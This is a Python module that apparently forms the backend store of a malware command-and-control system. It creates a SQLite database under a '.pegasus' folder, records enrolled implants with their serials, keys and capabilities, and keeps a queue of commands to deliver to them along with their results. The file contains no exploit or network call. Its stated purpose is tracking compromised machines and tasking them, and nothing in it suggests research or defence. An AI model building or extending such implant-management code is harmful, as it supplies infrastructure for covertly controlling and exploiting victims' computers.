"""Per-implant enrolment and command store."""
import json
import pathlib
import sqlite3
import time

DB = pathlib.Path.home() / ".pegasus" / "c2.db"


def _db() -> sqlite3.Connection:
    DB.parent.mkdir(parents=True, exist_ok=True)
    con = sqlite3.connect(DB, timeout=10)
    con.execute("CREATE TABLE IF NOT EXISTS dna(dna TEXT PRIMARY KEY, serial TEXT,"
                " key TEXT, caps TEXT, created REAL, last_seen REAL)")
    con.execute("CREATE TABLE IF NOT EXISTS cmds(id TEXT PRIMARY KEY, dna TEXT,"
                " body TEXT, state TEXT, created REAL, delivered REAL, result TEXT)")
    con.execute("CREATE INDEX IF NOT EXISTS ix_cmd ON cmds(dna, state)")
    return con


def enrol(dna: str, serial: str, key: str, caps: list[str]) -> None:
    con = _db()
    con.execute("INSERT OR REPLACE INTO dna VALUES(?,?,?,?,?,?)",
                (dna, serial, key, json.dumps(caps), time.time(), time.time()))
    con.commit()


def key_for(dna: str) -> str | None:
    row = _db().execute("SELECT key FROM dna WHERE dna=?", (dna,)).fetchone()
    return row[0] if row else None


def touch(dna: str) -> None:
    con = _db()
    con.execute("UPDATE dna SET last_seen=? WHERE dna=?", (time.time(), dna))
    con.commit()
